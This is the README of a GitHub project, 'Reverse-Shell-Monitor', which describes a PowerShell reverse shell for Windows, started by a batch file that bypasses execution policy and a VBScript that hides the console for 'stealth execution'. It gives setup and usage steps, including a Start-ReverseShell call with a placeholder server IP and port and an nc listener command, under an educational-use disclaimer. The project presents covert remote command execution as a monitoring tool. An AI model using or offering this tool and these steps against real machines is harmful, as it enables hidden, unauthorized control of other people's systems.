# Reverse-Shell-Monitor

Reverse-Shell-Monitor is a tool designed to initiate a reverse shell connection between a target machine and a server for administrative or testing purposes. The tool uses PowerShell, Batchfile, and VBScript for creating and running the reverse shell script on Windows systems. It is useful for penetration testers, system administrators, or cybersecurity professionals who need to monitor or execute remote commands on a target machine.
Features

Initiates a reverse shell connection from a target machine to a server.
Allows the server to send commands and receive the execution results from the target machine.
Built with PowerShell for efficient scripting.
Automates the execution with Batchfile and VBScript for stealthy deployment on Windows systems.
Includes error handling to ensure reliability and proper cleanup of resources.

## Code Overview

1. reverse-shell.ps1 (PowerShell Script)

This script opens a reverse shell to the specified IP address and port. The server can send commands to the target, which are executed on the target's machine, and the output is sent back to the server.
Parameters:

IPAddress: The IP address of the server (defaults to 192.168.0.105).
Port: The port to which the reverse shell connects (defaults to 4444).

How it works:

A TCP connection is established to the server.
Commands are received from the server.
The script executes the commands using cmd.exe.
The results of the commands are sent back to the server.
The connection continues until terminated by either side.

2. run_script.bat (Batchfile)

This batch file automates the execution of the PowerShell script while bypassing PowerShell's execution policy restrictions.

3. run_script.vbs (VBScript)

This VBScript runs the batch file in the background without showing the console window, providing stealth execution.

## Installation

Clone the repository:

    git clone https://github.com/your-username/Reverse-Shell-Monitor.git
    cd Bare_metal

Modify the reverse-shell.ps1 script with your server's IP address and port:

    Start-ReverseShell -IPAddress 'YOUR_SERVER_IP' -Port YOUR_PORT

Place the run_script.bat and run_script.vbs files in the same directory as reverse-shell.ps1.

Run the run_script.vbs file to start the reverse shell in the background:
Double-click the .vbs file for stealth execution.

## Usage

Start a listener on your server (using Netcat or another tool):

    nc -lvp 4444

Once the target machine runs the script, you can begin sending commands to the target.

## Disclaimer

This project is for educational purposes only. Unauthorized use of this tool is prohibited. The authors are not responsible for any misuse or damage caused by this software.

## Tags

    Python
    PowerShell
    Shell
    VBScript
    Batchfile

## License

This project is licensed under the MIT License.

## Contributors

    Gideon Kipamet - [GitHub](https://github.com/Giddy-K)

Feel free to contribute and add your socials, GitHub profile, or name here.
